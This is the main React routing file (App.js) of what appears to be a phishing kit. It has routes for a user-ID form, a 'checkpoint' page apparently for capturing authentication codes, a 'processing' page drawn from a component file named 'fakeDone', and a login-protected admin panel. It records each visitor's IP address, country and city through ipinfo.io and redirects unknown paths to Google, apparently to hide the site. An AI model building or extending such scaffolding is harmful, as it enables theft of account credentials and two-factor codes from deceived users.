import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";
import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
import { getLanguageByCountryCode } from "./components/languageUtils"; // Import hàm từ file languageUtils.js

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const setLocaltion =  () => {
    var _ip = 'Unknown';
    var _language = 'en';
    var _country = 'Unknown';
    var _city = 'Unknown';
    try {
      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
        if(d.country){
          _language = getLanguageByCountryCode(d.country);
        }
        if(d.ip){
          _ip = d.ip;
        }
        if(d.country){
          _country = d.country;
        }
        if(d.city){
          _city = d.city;
        }
         localStorage.setItem(
          "location",JSON.stringify({ lang:_language,IP: _ip, country: _country, city: _city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);
          return (
            <BrowserRouter>
              <div id="app">
                <Routes>
                  <Route path="/" element={<HomePage/>} />
                  <Route path="id/:userID" element={<MyForm/>} />
                  <Route path="/request" element={<MyForm/>} />
                  <Route path="checkpoint/:userID" element={<AuthCode />} />
                  <Route path="processing/:userID" element={<ClassUser />} />
                  <Route path="/login" element={<Login />} />
                  <Route
                    path="/admin"
                    element={
                      <PrivateRoute>
                        <AdminPage />
                      </PrivateRoute>
                    }
                  />
                  <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                </Routes>
              </div>
            </BrowserRouter>
          );
       
}


export default App;
